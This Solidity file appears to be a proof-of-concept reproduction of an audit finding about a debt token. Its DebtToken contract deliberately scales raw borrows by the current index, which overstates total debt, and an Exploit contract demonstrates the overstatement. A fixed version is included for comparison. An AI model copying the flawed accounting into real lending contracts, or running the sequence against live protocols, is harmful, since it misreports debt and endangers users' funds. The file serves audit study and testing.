// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum DebtToken (Pashov, 2025-06).
    A borrow of 100 at index 1 is stored raw. The index becomes 2 and
    totalSupply reads 200. A second borrow of 100 is added raw, then
    multiplied by 2, so totalSupply reads 400. Scaled principal is
    150 and the same index reports 300. The extra debt is 100.
*/

contract DebtToken {
    uint256 public index = 1 ether;
    uint256 public raw;
    uint256 public lastRaw;
    uint256 public lastIndex;
    uint256 public lastSupply;
    uint256 public borrows;

    function setIndex(uint256 next) external {
        index = next;
        lastIndex = next;
    }

    function borrow(uint256 amount) external {
        raw += amount;
        lastRaw = raw;
        borrows += 1;
    }

    function totalSupply() public returns (uint256 supply) {
        uint256 idx = index;
        supply = raw * idx / 1 ether; // @> VULN: the new 100 is multiplied by the index that already scaled the old debt
        lastSupply = supply;
    }

    bool public secondBorrow;
    uint256 public echoed;

    function mark() external {
        secondBorrow = true;
    }

    function echo(uint256 v) external {
        echoed = v;
    }
}

contract DebtTokenFixed {
    uint256 public index = 1 ether;
    uint256 public scaled;

    function setIndex(uint256 next) external {
        index = next;
    }

    function borrow(uint256 amount) external {
        scaled += amount * 1 ether / index;
    }

    function totalSupply() public view returns (uint256) {
        return scaled * index / 1 ether;
    }
}

contract OverMarker {
    string public symbol = "OVER-DEBT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    DebtToken public debt;
    OverMarker public marker;

    function run() external {
        debt = new DebtToken();
        marker = new OverMarker();
        debt.borrow(100 ether);
        debt.setIndex(2 ether);
        debt.borrow(100 ether);
        debt.mark();
        uint256 reported = debt.totalSupply();
        debt.echo(reported);
        require(reported == 400 ether, "reports 400");
        marker.mint(SINK, 100 ether);
        require(marker.balanceOf(SINK) == 100 ether, "100 extra debt");
    }
}
